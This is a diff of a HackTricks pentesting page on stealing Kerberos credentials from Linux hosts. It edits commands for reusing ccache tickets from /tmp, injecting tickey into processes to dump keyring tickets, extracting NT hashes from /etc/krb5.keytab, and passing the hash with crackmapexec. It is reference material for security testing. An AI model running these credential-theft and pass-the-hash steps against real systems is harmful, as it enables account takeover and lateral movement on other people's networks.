@@ -7,7 +7,7 @@
 * Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
 * Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** **🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 * **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
@@ -30,7 +30,7 @@ You can also check the following page to learn **other ways to enumerate AD from
 
 ### FreeIPA
 
-It is an open source **alternative** to Microsoft Windows **Active** **Directory**, primarily used as an integrated management solution for **Unix** environments. Learn more about it in:
+FreeIPA is an open-source **alternative** to Microsoft Windows **Active Directory**, mainly for **Unix** environments. It combines a complete **LDAP directory** with an MIT **Kerberos** Key Distribution Center for management akin to Active Directory. Utilizing the Dogtag **Certificate System** for CA & RA certificate management, it supports **multi-factor** authentication, including smartcards. SSSD is integrated for Unix authentication processes. Learn more about it in:
 
 {% content-ref url="../freeipa-pentesting.md" %}
 [freeipa-pentesting.md](../freeipa-pentesting.md)
@@ -48,40 +48,34 @@ In this page you are going to find different places were you could **find kerber
 
 ### CCACHE ticket reuse from /tmp
 
-> When tickets are set to be stored as a file on disk, the standard format and type is a CCACHE file. This is a simple binary file format to store Kerberos credentials. These files are typically stored in /tmp and scoped with 600 permissions
+CCACHE files are binary formats for **storing Kerberos credentials** are typically stored with 600 permissions in `/tmp`. These files can be identified by their **name format, `krb5cc_%{uid}`,** correlating to the user's UID. For authentication ticket verification, the **environment variable `KRB5CCNAME`** should be set to the path of the desired ticket file, enabling its reuse.
 
 List the current ticket used for authentication with `env | grep KRB5CCNAME`. The format is portable and the ticket can be **reused by setting the environment variable** with `export KRB5CCNAME=/tmp/ticket.ccache`. Kerberos ticket name format is `krb5cc_%{uid}` where uid is the user UID.
 
 ```bash
+# Find tickets
 ls /tmp/ | grep krb5cc
 krb5cc_1000
-krb5cc_1569901113
-krb5cc_1569901115
 
-export KRB5CCNAME=/tmp/krb5cc_1569901115
+# Prepare to use it
+export KRB5CCNAME=/tmp/krb5cc_1000
 ```
 
 ### CCACHE ticket reuse from keyring
 
-Processes may **store kerberos tickets inside their memory**, this tool can be useful to extract those tickets (ptrace protection should be disabled in the machine `/proc/sys/kernel/yama/ptrace_scope`): [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)
+**Kerberos tickets stored in a process's memory can be extracted**, particularly when the machine's ptrace protection is disabled (`/proc/sys/kernel/yama/ptrace_scope`). A useful tool for this purpose is found at [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey), which facilitates the extraction by injecting into sessions and dumping tickets into `/tmp`.
+
+To configure and use this tool, the steps below are followed:
 
 ```bash
-# Configuration and build
 git clone https://github.com/TarlogicSecurity/tickey
 cd tickey/tickey
 make CONF=Release
-
-[root@Lab-LSV01 /]# /tmp/tickey -i
-[*] krb5 ccache_name = KEYRING:session:sess_%{uid}
-[+] root detected, so... DUMP ALL THE TICKETS!!
-[*] Trying to inject in tarlogic[1000] session...
-[+] Successful injection at process 25723 of tarlogic[1000],look for tickets in /tmp/__krb_1000.ccache
-[*] Trying to inject in velociraptor[1120601115] session...
-[+] Successful injection at process 25794 of velociraptor[1120601115],look for tickets in /tmp/__krb_1120601115.ccache
-[*] Trying to inject in trex[1120601113] session...
-[+] Successful injection at process 25820 of trex[1120601113],look for tickets in /tmp/__krb_1120601113.ccache
-[X] [uid:0] Error retrieving tickets
+/tmp/tickey -i
 ```
+
+This procedure will attempt to inject into various sessions, indicating success by storing extracted tickets in `/tmp` with a naming convention of `__krb_UID.ccache`. 
+
 
 ### CCACHE ticket reuse from SSSD KCM
 
@@ -106,47 +100,37 @@ klist -k /etc/krb5.keytab
 
 ### Extract accounts from /etc/krb5.keytab
 
-The service keys used by services that run as root are usually stored in the keytab file **`/etc/krb5.keytab`**. This service key is the equivalent of the service's password, and must be kept secure.
+Service account keys, essential for services operating with root privileges, are securely stored in **`/etc/krb5.keytab`** files. These keys, akin to passwords for services, demand strict confidentiality.
 
-Use [`klist`](https://adoptopenjdk.net/?variant=openjdk13\&jvmVariant=hotspot) to read the keytab file and parse its content. The key that you see when the [key type](https://cwiki.apache.org/confluence/display/DIRxPMGT/Kerberos+EncryptionKey) is 23 is the actual **NT Hash of the user**.
+To inspect the keytab file's contents, **`klist`** can be employed. The tool is designed to display key details, including the **NT Hash** for user authentication, particularly when the key type is identified as 23.
 
-```
-klist.exe -t -K -e -k FILE:C:\Users\User\downloads\krb5.keytab
-[...]
-[26] Service principal: host/COMPUTER@DOMAIN
-	 KVNO: 25
-	 Key type: 23
-	 Key: 31d6cfe0d16ae931b73c59d7e0c089c0
-	 Time stamp: Oct 07,  2019 09:12:02
-[...]
+```bash
+klist.exe -t -K -e -k FILE:C:/Path/to/your/krb5.keytab
+# Output includes service principal details and the NT Hash
 ```
 
-On Linux you can use [`KeyTabExtract`](https://github.com/sosdave/KeyTabExtract): we want RC4 HMAC hash to reuse the NLTM hash.
+For Linux users, **`KeyTabExtract`** offers functionality to extract the RC4 HMAC hash, which can be leveraged for NTLM hash reuse.
 
 ```bash
 python3 keytabextract.py krb5.keytab 
-[!] No RC4-HMAC located. Unable to extract NTLM hashes. # No luck
-[+] Keytab File successfully imported.
-        REALM : DOMAIN
-        SERVICE PRINCIPAL : host/computer.domain
-        NTLM HASH : 31d6cfe0d16ae931b73c59d7e0c089c0 # Lucky
+# Expected output varies based on hash availability
 ```
 
-On **macOS** you can use [**`bifrost`**](https://github.com/its-a-feature/bifrost).
+On macOS, **`bifrost`** serves as a tool for keytab file analysis.
 
 ```bash
-./bifrost -action dump -source keytab -path test
+./bifrost -action dump -source keytab -path /path/to/your/file
 ```
 
-Connect to the machine using the account and the hash with CME.
+Utilizing the extracted account and hash information, connections to servers can be established using tools like **`crackmapexec`**.
 
 ```bash
-$ crackmapexec 10.XXX.XXX.XXX -u 'COMPUTER$' -H "31d6cfe0d16ae931b73c59d7e0c089c0" -d "DOMAIN"
-CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae931b73c59d7e0c089c0  
+crackmapexec 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"
 ```
 
 ## References
-
+* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
+* [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)
 * [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory)
 
 <details>
@@ -156,7 +140,7 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae
 * Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
 * Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** **🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 * **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
